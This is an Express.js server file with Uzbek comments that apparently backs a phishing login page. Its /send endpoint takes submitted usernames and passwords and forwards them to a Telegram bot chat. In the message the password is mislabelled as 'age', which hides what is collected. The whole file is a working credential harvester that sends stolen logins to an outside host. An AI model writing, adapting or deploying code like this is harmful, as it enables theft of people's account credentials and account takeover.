require("dotenv").config();
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express(); // app shu yerda aniqlangan bo‘lishi kerak

// Static fayllar
app.use(express.static(__dirname));
app.use(bodyParser.json());

// Environment variables
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Server ishlayotganini tekshirish
app.get("/", (req, res) => {
  res.send("✅ Server ishlayapti!");
});

// Frontenddan ma'lumot qabul qilish
app.post("/send", async (req, res) => {
  const { username, password } = req.body;
  const message = `🔐 Sizga yangi habar keldi:\nIsm: ${username}\nYosh: ${password}`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });
    res.sendStatus(200);
  } catch (err) {
    console.error("Xato:", err.message);
    res.sendStatus(500);
  }
});

// Port
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server ${PORT}-portda ishlayapti`);
});
